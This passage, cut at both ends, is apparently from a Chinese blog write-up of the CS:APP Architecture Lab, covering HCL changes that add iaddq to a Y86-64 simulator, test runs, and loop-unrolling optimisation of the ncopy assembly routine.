class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada">word dstE = [<br>    icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ &#125; &amp;&amp; Cnd : <span class="hljs-type">rB</span>;<br>    icode <span class="hljs-keyword">in</span> &#123; IIRMOVQ, IOPQ, IIADDQ &#125; : <span class="hljs-type">rB</span>;<br>    icode <span class="hljs-keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : <span class="hljs-type">RRSP</span>;<br>    <span class="hljs-number">1</span> : <span class="hljs-type">RNONE</span>;  # Don<span class="hljs-symbol">&#x27;t</span> write any register<br>];<br></code></pre></td></tr></table></figure><p>执行阶段<code>ALU</code>对<code>aluA</code>和<code>aluB</code>进行计算，<code>aluA</code>可以是<code>valA</code>、<code>valC</code> 、<code>8</code>或<code>-8</code>，<code>aluB</code>只能是<code>valB</code></p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-comment">## Select input A to ALU</span><br><span class="hljs-attribute">word aluA = [</span><br><span class="hljs-attribute">    icode in &#123; IRRMOVQ, IOPQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">valA;</span><br>    <span class="hljs-attribute">icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">valC;</span><br>    <span class="hljs-attribute">icode in &#123; ICALL, IPUSHQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">-8;</span><br>    <span class="hljs-attribute">icode in &#123; IRET, IPOPQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">8;</span><br>    <span class="hljs-comment"># Other instructions don&#x27;t need ALU</span><br><span class="hljs-attribute">];</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">## Select input B to ALU</span><br><span class="hljs-attribute">word aluB = [</span><br><span class="hljs-attribute">    icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="hljs-attribute">              IPUSHQ, IRET, IPOPQ, IIADDQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">valB;</span><br>    <span class="hljs-attribute">icode in &#123; IRRMOVQ, IIRMOVQ &#125;</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">0;</span><br>    <span class="hljs-comment"># Other instructions don&#x27;t need ALU</span><br>];<br></code></pre></td></tr></table></figure><p>同时需要更新条件码寄存器</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bool set_cc</span> = icode in &#123; IOPQ,IIADDQ &#125;;<br></code></pre></td></tr></table></figure><p>iiaddq不涉及访存和转移操作，无修改访存阶段和更新PC阶段。</p><p>使用lab附的SEQ模拟器的TTY模式对HCL文件进行测试。（同时也建议大家去看看GUI模式，很惊艳</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs routeros">voidsolar@admin:~/csapp_lab/archlab-handout/sim/seq$ ./ssim -t <span class="hljs-built_in">..</span>/y86-code/asumi.yo<br>Y86-64 Processor: seq-full.hcl<br>137 bytes of code read<br><span class="hljs-keyword">IF</span>: Fetched irmovq at 0x0.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rsp, valC = 0x100<br><span class="hljs-keyword">IF</span>: Fetched call at 0xa.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x38<br>Wrote 0x13 <span class="hljs-keyword">to</span><span class="hljs-built_in"> address </span>0xf8<br><span class="hljs-keyword">IF</span>: Fetched irmovq at 0x38.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x18<br><span class="hljs-keyword">IF</span>: Fetched irmovq at 0x42.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rsi, valC = 0x4<br><span class="hljs-keyword">IF</span>: Fetched call at 0x4c.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x56<br>Wrote 0x55 <span class="hljs-keyword">to</span><span class="hljs-built_in"> address </span>0xf0<br><span class="hljs-keyword">IF</span>: Fetched xorq at 0x56.  <span class="hljs-attribute">ra</span>=%rax, <span class="hljs-attribute">rb</span>=%rax, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched andq at 0x58.  <span class="hljs-attribute">ra</span>=%rsi, <span class="hljs-attribute">rb</span>=%rsi, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched jmp at 0x5a.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x83<br><span class="hljs-keyword">IF</span>: Fetched jne at 0x83.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x63<br><span class="hljs-keyword">IF</span>: Fetched mrmovq at 0x63.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched addq at 0x6d.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rax, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x6f.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x8<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x79.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rsi, valC = 0xffffffffffffffff<br><span class="hljs-keyword">IF</span>: Fetched jne at 0x83.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x63<br><span class="hljs-keyword">IF</span>: Fetched mrmovq at 0x63.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched addq at 0x6d.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rax, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x6f.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x8<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x79.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rsi, valC = 0xffffffffffffffff<br><span class="hljs-keyword">IF</span>: Fetched jne at 0x83.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x63<br><span class="hljs-keyword">IF</span>: Fetched mrmovq at 0x63.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched addq at 0x6d.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rax, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x6f.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x8<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x79.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rsi, valC = 0xffffffffffffffff<br><span class="hljs-keyword">IF</span>: Fetched jne at 0x83.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x63<br><span class="hljs-keyword">IF</span>: Fetched mrmovq at 0x63.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched addq at 0x6d.  <span class="hljs-attribute">ra</span>=%r10, <span class="hljs-attribute">rb</span>=%rax, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x6f.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rdi, valC = 0x8<br><span class="hljs-keyword">IF</span>: Fetched iaddq at 0x79.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=%rsi, valC = 0xffffffffffffffff<br><span class="hljs-keyword">IF</span>: Fetched jne at 0x83.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x63<br><span class="hljs-keyword">IF</span>: Fetched ret at 0x8c.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched ret at 0x55.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x0<br><span class="hljs-keyword">IF</span>: Fetched halt at 0x13.  <span class="hljs-attribute">ra</span>=----, <span class="hljs-attribute">rb</span>=----, valC = 0x0<br>32 instructions executed<br>Status = HLT<br>Condition Codes: <span class="hljs-attribute">Z</span>=1 <span class="hljs-attribute">S</span>=0 <span class="hljs-attribute">O</span>=0<br>Changed Register State:<br>%rax:   0x0000000000000000      0x0000abcdabcdabcd<br>%rsp:   0x0000000000000000      0x0000000000000100<br>%rdi:   0x0000000000000000      0x0000000000000038<br>%r10:   0x0000000000000000      0x0000a000a000a000<br>Changed Memory State:<br>0x00f0: 0x0000000000000000      0x0000000000000055<br>0x00f8: 0x0000000000000000      0x0000000000000013<br>ISA Check Succeeds<br></code></pre></td></tr></table></figure><h4 id="基准测试"><a href="#基准测试" class="headerlink" title="基准测试"></a>基准测试</h4><p>运行<strong>基准测试</strong>保证指令集原有指令没有被破坏</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs gradle">voidsolar@admin:~<span class="hljs-regexp">/csapp_lab/</span>archlab-handout<span class="hljs-regexp">/sim/</span>seq$ cd ../y86-code; make testssim<br>..<span class="hljs-regexp">/seq/</span>ssim -t asum.yo &gt; asum.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t asumr.yo &gt; asumr.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t cjr.yo &gt; cjr.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t j-cc.yo &gt; j-cc.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t poptest.yo &gt; poptest.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t pushquestion.yo &gt; pushquestion.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t pushtest.yo &gt; pushtest.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog1.yo &gt; prog1.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog2.yo &gt; prog2.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog3.yo &gt; prog3.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog4.yo &gt; prog4.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog5.yo &gt; prog5.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog6.yo &gt; prog6.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog7.yo &gt; prog7.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t prog8.yo &gt; prog8.seq<br>..<span class="hljs-regexp">/seq/</span>ssim -t ret-hazard.yo &gt; ret-hazard.seq<br><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;ISA Check&quot;</span> *.seq<br>asum.seq:ISA Check Succeeds<br>asumr.seq:ISA Check Succeeds<br>cjr.seq:ISA Check Succeeds<br>j-cc.seq:ISA Check Succeeds<br>poptest.seq:ISA Check Succeeds<br>prog1.seq:ISA Check Succeeds<br>prog2.seq:ISA Check Succeeds<br>prog3.seq:ISA Check Succeeds<br>prog4.seq:ISA Check Succeeds<br>prog5.seq:ISA Check Succeeds<br>prog6.seq:ISA Check Succeeds<br>prog7.seq:ISA Check Succeeds<br>prog8.seq:ISA Check Succeeds<br>pushquestion.seq:ISA Check Succeeds<br>pushtest.seq:ISA Check Succeeds<br>ret-hazard.seq:ISA Check Succeeds<br>rm asum.seq asumr.seq cjr.seq j-cc.seq poptest.seq pushquestion.seq pushtest.seq prog1.seq prog2.seq prog3.seq prog4.seq prog5.seq prog6.seq prog7.seq prog8.seq ret-hazard.seq<br></code></pre></td></tr></table></figure><h4 id="回归测试"><a href="#回归测试" class="headerlink" title="回归测试"></a>回归测试</h4><p>测试除了iaddq以外的指令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">voidsolar@admin:~<span class="hljs-regexp">/csapp_lab/</span>archlab-handout<span class="hljs-regexp">/sim/y</span>86-code$ cd ..<span class="hljs-regexp">/ptest; make SIM=../</span>seq/ssim<br>.<span class="hljs-regexp">/optest.pl -s ../</span>seq/ssim <br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">49</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/jtest.pl -s ../</span>seq/ssim <br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">64</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/ctest.pl -s ../</span>seq/ssim <br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">22</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/htest.pl -s ../</span>seq/ssim <br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">600</span> ISA Checks Succeed<br></code></pre></td></tr></table></figure><p>测试自己实现的iaddq</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">voidsolar@admin:~<span class="hljs-regexp">/csapp_lab/</span>archlab-handout<span class="hljs-regexp">/sim/</span>ptest$ cd ..<span class="hljs-regexp">/ptest; make SIM=../</span>seq/ssim TFLAGS=-i<br>.<span class="hljs-regexp">/optest.pl -s ../</span>seq/ssim -i<br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">58</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/jtest.pl -s ../</span>seq/ssim -i<br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">96</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/ctest.pl -s ../</span>seq/ssim -i<br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">22</span> ISA Checks Succeed<br>.<span class="hljs-regexp">/htest.pl -s ../</span>seq/ssim -i<br>Simulating with ..<span class="hljs-regexp">/seq/</span>ssim<br>  All <span class="hljs-number">756</span> ISA Checks Succeed<br></code></pre></td></tr></table></figure><p>至此Part B全部完成</p><h2 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h2><p>我们需要修改HCL和ncopy来优化程序，通过程序的效率计算分数</p><p>首先iaddq是一条效率很高的指令，它能够将两步化为一步。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ncopy - copy src to dst, returning number of positive ints</span><br><span class="hljs-comment"> * contained in src array.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">word_t</span> <span class="hljs-title function_">ncopy</span><span class="hljs-params">(<span class="hljs-type">word_t</span> *src, <span class="hljs-type">word_t</span> *dst, <span class="hljs-type">word_t</span> len)</span><br>&#123;<br>    <span class="hljs-type">word_t</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">word_t</span> val;<br><br>    <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span>) &#123;<br>    val = *src++;<br>    *dst++ = val;<br>    <span class="hljs-keyword">if</span> (val &gt; <span class="hljs-number">0</span>)<br>        count++;<br>    len--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure><p>原汇编代码如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text"># You can modify this portion<br>    # Loop header<br>    xorq %rax,%rax      # count = 0;<br>    andq %rdx,%rdx      # len &lt;= 0?<br>    jle Done        # if so, goto Done:<br><br>Loop:   mrmovq (%rdi), %r10 # read val from src...<br>    rmmovq %r10, (%rsi) # ...and store it to dst<br>    andq %r10, %r10     # val &lt;= 0?<br>    jle Npos        # if so, goto Npos:<br>    irmovq $1, %r10<br>    addq %r10, %rax     # count++<br>Npos:   irmovq $1, %r10<br>    subq %r10, %rdx     # len--<br>    irmovq $8, %r10<br>    addq %r10, %rdi     # src++<br>    addq %r10, %rsi     # dst++<br>    andq %rdx,%rdx      # len &gt; 0?<br>    jg Loop         # if so, goto Loop:<br></code></pre></td></tr></table></figure><p>利用iaddq替换原有的赋值指令。替换后</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># You can modify this portion</span><br>    <span class="hljs-comment"># Loop header</span><br>    xorq %rax,%rax      <span class="hljs-comment"># count = 0;</span><br>    andq %rdx,%rdx      <span class="hljs-comment"># len &lt;= 0?</span><br>    jle Done        <span class="hljs-comment"># if so, goto Done:</span><br><br>Loop:   <br>    mrmov<span class="hljs-string">q (%rdi)</span>, %r10 <span class="hljs-comment"># read val from src...</span><br>    rmmovq %r10, (%rsi) <span class="hljs-comment"># ...and store it to dst</span><br>    andq %r10, %r10     <span class="hljs-comment"># val &lt;= 0?</span><br>    jle Npos        <span class="hljs-comment"># if so, goto Npos:</span><br>    iaddq $1, %rax      <span class="hljs-comment"># count++</span><br>Npos:   <br>    iaddq $-<span class="hljs-number">1</span>, %rdx     <span class="hljs-comment"># len--</span><br>    iaddq $8, %rdi      <span class="hljs-comment"># src++</span><br>    iaddq $8, %rsi      <span class="hljs-comment"># dst++</span><br>    andq %rdx,%rdx      <span class="hljs-comment"># len &gt; 0?</span><br>    jg Loop         <span class="hljs-comment"># if so, goto Loop:</span><br></code></pre></td></tr></table></figure><p>根据文档的提示，我们尝试使用循环展开对程序进行优化，循环展开通过增加每次迭代计算的元素的数量，减少循环的迭代次数来提升效率。</p><p>本文在参考了别人的博文的基础上使用6路循环展开</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># Loop header</span><br>    andq %rdx,%rdx      <span class="hljs-comment"># len &lt;= 0?</span><br>    jmp test<br>Loop:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    rmmovq %r8,(%rsi)<br>    andq %r8,%r8<br>    jle Loop1<br>    iaddq $1,%rax<br>Loop1:<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">8</span>(%rsi)<br>    andq %r8,%r8<br>    jle Loop2<br>    iaddq $1,%rax<br>Loop2:<br>    mrmovq <span class="hljs-number">16</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">16</span>(%rsi)<br>    andq %r8,%r8<br>    jle Loop3<br>    iaddq $1,%rax<br>Loop3:<br>    mrmovq <span class="hljs-number">24</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">24</span>(%rsi)<br>    andq %r8,%r8<br>    jle Loop4<br>    iaddq $1,%rax<br>Loop4:<br>    mrmovq <span class="hljs-number">32</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">32</span>(%rsi)<br>    andq %r8,%r8<br>    jle Loop5<br>    iaddq $1,%rax<br>Loop5:<br>    mrmovq <span class="hljs-number">40</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">40</span>(%rsi)<br>    iaddq $48,%rdi<br>    iaddq $48,%rsi<br>    andq %r8,%r8<br>    jle test<br>    iaddq $1,%rax   <br>test:<br>    iaddq $-<span class="hljs-number">6</span>, %rdx         <span class="hljs-comment"># 先减，判断够不够6个</span><br>    jge Loop                <span class="hljs-comment"># 6路展开</span><br>    iaddq $-<span class="hljs-number">8</span>,%rdi<br>    iaddq $-<span class="hljs-number">8</span>,%rsi<br>    iaddq $6, %rdx<br>    jmp test2               <span class="hljs-comment">#剩下的</span><br>Lore:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    rmmovq %r8,(%rsi)<br>    andq %r8,%r8<br>    jle test2<br>    iaddq $1,%rax<br>test2:<br>    iaddq $8,%rdi<br>    iaddq $8,%rsi<br>    iaddq $-<span class="hljs-number">1</span>, %rdx<br>    jge Lore<br></code></pre></td></tr></table></figure><p><strong>逻辑简单</strong>：每次循环都对6个数进行复制，每次复制就设置一个条件语句判断返回时是否加1，对于剩下的数据每次循环只对1个数进行复制。</p><p>此时测试发现对于小数据的CPE值非常大，需要考虑对小数据进行优化。</p><p>于是对剩余数据采取3路循环展开。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs perl">test:<br>    iaddq $-<span class="hljs-number">6</span>, %rdx         <span class="hljs-comment"># 先减，判断够不够6个</span><br>    jge Loop                <span class="hljs-comment"># 6路展开</span><br>    iaddq $6, %rdx<br>    jmp test2               <span class="hljs-comment">#剩下的</span><br><br>L:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    rmmovq %r8,(%rsi)<br>    andq %r8,%r8<br>    jle L1<br>    iaddq $1,%rax<br>L1:<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">8</span>(%rsi)<br>    andq %r8,%r8<br>    jle L2<br>    iaddq $1,%rax<br>L2:<br>    mrmovq <span class="hljs-number">16</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">16</span>(%rsi)<br>    iaddq $24,%rdi<br>    iaddq $24,%rsi<br>    andq %r8,%r8<br>    jle test2<br>    iaddq $1,%rax<br>test2:<br>    iaddq $-<span class="hljs-number">3</span>, %rdx         <span class="hljs-comment"># 先减，判断够不够3个</span><br>    jge L<br>    iaddq $2, %rdx          <span class="hljs-comment"># -1则不剩了，直接Done,0 剩一个, 1剩2个</span><br>    je R<span class="hljs-number">0</span><br>    jl Done<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    rmmovq %r8,(%rsi)<br>    andq %r8,%r8<br>    jle R2<br>    iaddq $1,%rax<br>R2:<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">8</span>(%rsi)<br>    andq %r8,%r8<br>    jle Done<br>    iaddq $1,%rax<br>    jmp Done<br>R<span class="hljs-number">0</span>:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    rmmovq %r8,(%rsi)<br>    andq %r8,%r8<br>    jle Done<br>    iaddq $1,%rax<br></code></pre></td></tr></table></figure><h4 id="消除气泡"><a href="#消除气泡" class="headerlink" title="消除气泡"></a>消除气泡</h4><p>程序多次使用</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>   rmmovq %r8,(%rsi)<br></code></pre></td></tr></table></figure><p>使用转发避免数据冒险，也至少会有一个气泡。</p><p>另外一种优化方法是多取一个寄存器，连续进行两次数据复制</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 